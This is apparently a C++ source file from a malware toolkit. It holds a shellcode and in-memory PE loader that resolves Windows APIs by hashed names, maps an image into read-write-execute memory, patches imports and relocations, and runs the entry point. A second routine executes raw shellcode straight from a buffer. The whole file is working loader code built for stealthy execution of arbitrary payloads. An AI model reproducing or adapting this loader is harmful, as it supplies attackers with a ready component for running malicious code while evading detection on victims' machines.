#include "pch.h"
#include "utils.h"
#include "api_resolver.h"
#include <pe_bliss.h>
#include <string>

#ifdef ENABLE_OLD_SHELLCODE
#define MAKE_API(dll,x) this->x = (decltype(this->x))ApiResolver::get_proc_address(dll, CT_HASH(#x))
extern std::map<uint32_t, uint32_t> global_rfs_map;
#endif
namespace Utils
{
#ifdef ENABLE_OLD_SHELLCODE
    class ShellCode
    {
    public:
        ShellCode()
        {
            kernel32_dll_ = ApiResolver::get_module_handle(CT_HASH(L"kernel32.dll"));
            MAKE_API(kernel32_dll_, CreateThread);
            MAKE_API(kernel32_dll_, CloseHandle);
            MAKE_API(kernel32_dll_, WaitForSingleObject);
            MAKE_API(kernel32_dll_, GetExitCodeThread);
            MAKE_API(kernel32_dll_, VirtualFree);
            MAKE_API(kernel32_dll_, VirtualAlloc);
            int api_count = (offsetof(ShellCode, api_end_) - offsetof(ShellCode, api_start_)) / sizeof(uintptr_t) - 1;
            uintptr_t* api_array = &api_start_ + 1;
            for (int i = 0; i < api_count; i++)
            {
                if (api_array[i] == NULL)
                {
                    initialize_ = false;
                    return;
                }
            }
            initialize_ = true;
        }
        ~ShellCode()
        {

        }
        static uint32_t __stdcall thread_start_routine(void* param)
        {
            try
            {
                decltype(&shellcode_entrypoint) shellcode_routine = (decltype(&shellcode_entrypoint))((ShellCode*)param)->entrypoint_;
                return shellcode_routine();
            }
            catch(...)
            {
                return ERROR_EXCEPTION_IN_SERVICE;
            }
        }
        uint32_t execute_shellcode(std::string shellcode)
        {
            if (initialize_ == false)
            {
                return ERROR_NOT_FOUND;
            }
            DWORD exit_code = 0;
            DWORD old_protect = 0;
            std::stringstream shellcode_stream(shellcode);
            pe_bliss::pe_base image(pe_bliss::pe_factory::create_pe(shellcode_stream));
            shellcode_ = VirtualAlloc(NULL, image.get_size_of_image(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (shellcode_ == nullptr)
            {
                return ERROR_OUTOFMEMORY;
            }
            
            for (auto& section : image.get_image_sections())
            {
                memcpy(reinterpret_cast<uint8_t*>(shellcode_) + section.get_virtual_address(),
                    section.get_raw_data().data(),
                    section.get_raw_data().size());
            }
            
            for (auto &import_list : pe_bliss::get_imported_functions(image))
            {
                uint32_t base = (uint32_t)GetModuleHandleA(import_list.get_name().c_str());
                for (auto itor = import_list.get_imported_functions().begin();
                    itor != import_list.get_imported_functions().end();
                    itor++)
                {
                    size_t index = itor - import_list.get_imported_functions().begin();
                    uint32_t offset = global_rfs_map[Utils::Crypto::aphash(itor->get_name().c_str())];
                    if (!offset)
                    {
                        return ERROR_SYMLINK_NOT_SUPPORTED;
                    }
                    ((uint32_t*)((uint32_t)shellcode_ + import_list.get_rva_to_iat()))[index] = base + offset;
                }
            }

            for (auto &reloc_list : pe_bliss::get_relocations(image))
            {
                for (auto &reloc : reloc_list.get_relocations())
                {
                    uint32_t reloction_address = (uint32_t)shellcode_ + reloc_list.get_rva() + reloc.get_rva();
                    switch (reloc.get_type())
                    {
                    case IMAGE_REL_I386_DIR32:
                        *reinterpret_cast<int32_t*>(reloction_address) += (uint32_t)shellcode_ - image.get_image_base_32();
                        *reinterpret_cast<uint32_t*>(reloction_address) = **reinterpret_cast<uint32_t**>(reloction_address);
                        break;
                    case 0x4:
                    {
                        uint8_t* target_address = (uint8_t*)reloction_address + 4 + *reinterpret_cast<int32_t*>(reloction_address);
                        target_address = *(uint8_t**)target_address;
                        *reinterpret_cast<int32_t*>(reloction_address) = (uint32_t)target_address - (reloction_address + 4);
                        break;
                    }  
                    case IMAGE_REL_BASED_HIGHLOW:
                        *reinterpret_cast<int32_t*>(reloction_address) += (uint32_t)shellcode_ - image.get_image_base_32();
                        break;
                    }
                }
            }
            entrypoint_ = reinterpret_cast<uint8_t*>(shellcode_) + image.get_ep();
            HANDLE handle = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)&ShellCode::thread_start_routine, this, NULL, NULL);
            WaitForSingleObject(handle, INFINITE);
            GetExitCodeThread(handle, &exit_code);
            CloseHandle(handle);
            if (exit_code != ERROR_SUCCESS)
            {
                VirtualFree(shellcode_, shellcode.size(), MEM_RELEASE);
            }
            return exit_code;
        }
    protected:
    private:
        bool initialize_;
        HMODULE user32_dll_;
        HMODULE kernel32_dll_;
        HMODULE gdi32_dll_;
        void* shellcode_;
        void* entrypoint_;
        uintptr_t api_start_;
        DEFINEAPI(CreateThread);
        DEFINEAPI(CloseHandle);
        DEFINEAPI(WaitForSingleObject);
        DEFINEAPI(GetExitCodeThread);
        DEFINEAPI(VirtualFree);
        DEFINEAPI(VirtualAlloc);
        uintptr_t api_end_;
    };

    uint32_t execute_shellcode(std::string shellcode)
    {
        ShellCode shellcode_class;
        return shellcode_class.execute_shellcode(shellcode);
    }
#endif
    HINSTANCE execute_raw_shellcode(const std::string& shellcode)
    {
        extern HINSTANCE shellcode_entry_point();
        auto VirtualAlloc = IMPORT(L"kernel32.dll", VirtualAlloc);
        void* buffer = VirtualAlloc(NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        memcpy(buffer, shellcode.data(), shellcode.size());
        decltype(&shellcode_entry_point) entry = (decltype(&shellcode_entry_point))buffer;
        HINSTANCE result = entry();
        VirtualFree(buffer, shellcode.size(), MEM_RELEASE);
        return result;
    }
}

